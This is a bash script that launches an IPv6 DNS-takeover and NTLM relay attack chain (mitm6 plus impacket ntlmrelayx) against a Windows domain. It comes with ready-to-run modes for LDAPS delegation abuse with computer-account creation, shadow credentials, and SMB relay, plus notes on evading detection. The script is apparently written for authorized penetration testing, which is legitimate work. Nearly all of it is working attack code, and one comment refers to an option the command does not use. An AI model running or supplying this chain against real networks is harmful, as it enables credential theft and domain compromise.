#!/usr/bin/env bash
# mitm6_relay_launcher.sh - Launch the mitm6 (IPv6 DHCPv6/DNS takeover) + ntlmrelayx
# chain in a tmux session, with sane defaults and a cleanup trap.
#
# USAGE:
#   sudo ./mitm6_relay_launcher.sh <domain> <interface> <relay_mode> <target>
#     relay_mode: ldaps-rbcd | ldaps-shadow | smb
#   examples:
#     sudo ./mitm6_relay_launcher.sh corp.local eth0 ldaps-rbcd dc01.corp.local
#     sudo ./mitm6_relay_launcher.sh corp.local eth0 smb        targets.txt
#
# DEPENDENCIES: mitm6, impacket (ntlmrelayx.py / impacket-ntlmrelayx), tmux, ip
#   pipx install mitm6 ; pipx install impacket
#
# OPSEC: This poisons IPv6 DHCPv6 (UDP 547) + DNS for the WHOLE segment.
#   Extremely loud. RA-Guard / DHCPv6-Guard or "rogue DHCPv6" SIEM rules will fire.
#   Only run in authorized scope; --ignore-nofqdn limits noise; stop ASAP.

set -euo pipefail

DOMAIN="${1:?domain required}"
IFACE="${2:?interface required}"
MODE="${3:?relay_mode required: ldaps-rbcd|ldaps-shadow|smb}"
TARGET="${4:?target (host/file) required}"

SESSION="mitm6relay"
WPAD_HOST="proxy.${DOMAIN}"   # plausible WPAD host to reduce suspicion

# Pick the ntlmrelayx binary that exists on this box.
if command -v impacket-ntlmrelayx >/dev/null 2>&1; then
    RELAYX="impacket-ntlmrelayx"
elif command -v ntlmrelayx.py >/dev/null 2>&1; then
    RELAYX="ntlmrelayx.py"
else
    echo "[!] ntlmrelayx not found (install impacket)"; exit 1
fi

case "$MODE" in
    ldaps-rbcd)
        # Relay to LDAPS, create a controlled computer account, set RBCD on victim.
        RELAY_CMD="$RELAYX -6 -ts -wh ${WPAD_HOST} -t ldaps://${TARGET} --delegate-access --add-computer"
        ;;
    ldaps-shadow)
        # Relay to LDAPS, add Key Credential (shadow credentials) to victim machine.
        RELAY_CMD="$RELAYX -6 -ts -wh ${WPAD_HOST} -t ldaps://${TARGET} --shadow-credentials --shadow-target self"
        ;;
    smb)
        if [[ -f "$TARGET" ]]; then T="-tf $TARGET"; else T="-t smb://$TARGET"; fi
        RELAY_CMD="$RELAYX -6 -ts -wh ${WPAD_HOST} $T -smb2support -socks"
        ;;
    *)
        echo "[!] unknown mode: $MODE"; exit 1 ;;
esac

cleanup() {
    echo "[*] cleaning up tmux session $SESSION"
    tmux kill-session -t "$SESSION" 2>/dev/null || true
}
trap cleanup INT TERM

echo "[*] Launching mitm6 + relay for domain=$DOMAIN iface=$IFACE mode=$MODE"
echo "[*] Relay cmd: $RELAY_CMD"

tmux new-session -d -s "$SESSION" -n relay "$RELAY_CMD; read -p 'relay exited, ENTER to close'"
sleep 2
# --no-ra avoids continuous router advertisements (quieter); -d restricts to target domain
tmux new-window -t "$SESSION" -n mitm6 \
    "mitm6 -d $DOMAIN -i $IFACE --ignore-nofqdn; read -p 'mitm6 exited, ENTER to close'"

echo "[+] Attached. Detach with Ctrl-b d. To stop everything: tmux kill-session -t $SESSION"
tmux attach -t "$SESSION"
